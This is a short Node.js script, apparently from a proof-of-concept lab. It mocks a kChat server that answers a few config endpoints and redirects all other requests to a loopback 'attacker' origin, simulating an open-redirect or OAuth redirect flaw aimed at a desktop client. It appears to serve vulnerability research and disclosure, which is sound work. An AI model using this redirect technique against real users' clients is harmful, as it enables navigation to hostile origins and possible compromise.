// Simulated legitimate kChat server (the one the victim has configured).
// Its root performs a top-level navigation to a foreign origin, standing in for
// an OAuth redirect_uri / open redirect in the real webapp.
const http = require('http');
const ATTACKER = 'http://127.0.0.2:8098/';
http.createServer((req, res) => {
  console.log('[server] ' + req.method + ' ' + req.url);
  if (req.url.startsWith('/api/v4/config/client')) { res.setHeader('Content-Type','application/json'); return res.end(JSON.stringify({Version:'9.5.0', SiteURL:'http://127.0.0.1:8099', SiteName:'lab'})); }
  if (req.url.startsWith('/api/v4/plugins/webapp')) { res.setHeader('Content-Type','application/json'); return res.end('[]'); }
  if (req.url.startsWith('/api/v4/license/client')) { res.setHeader('Content-Type','application/json'); return res.end('{}'); }
  res.writeHead(302, {Location: ATTACKER + '?via=302&persist'});
  res.end();
}).listen(8099, '127.0.0.1', () => console.log('[server] listening 127.0.0.1:8099'));
